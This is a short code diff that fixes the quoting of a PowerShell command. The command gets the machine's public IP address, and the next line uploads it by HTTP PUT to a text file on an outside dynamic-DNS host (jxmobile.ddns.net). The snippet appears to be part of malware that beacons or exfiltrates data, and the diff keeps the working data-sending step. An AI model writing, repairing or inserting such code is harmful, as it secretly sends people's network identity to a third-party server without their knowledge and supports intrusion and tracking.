@@ -1,2 +1,2 @@
-var res = runCmd("powershell -Command \"(Invoke-RestMethod 'https://api.ipify.org')\"");
+var res = runCmd('powershell -Command "(Invoke-RestMethod https://api.ipify.org)"');
 httpPut('http://jxmobile.ddns.net/tool/icings.txt', res);
